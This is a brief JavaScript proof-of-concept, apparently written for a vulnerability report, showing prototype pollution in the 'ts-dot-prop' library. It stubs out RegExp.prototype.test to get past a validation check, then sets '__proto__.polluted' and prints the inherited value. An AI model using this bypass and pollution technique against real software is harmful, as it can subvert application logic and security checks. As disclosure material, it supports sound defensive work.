RegExp.prototype.test = () => false;
const tsDot = require('ts-dot-prop');
let obj = {};
console.log({}.polluted);
tsDot.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);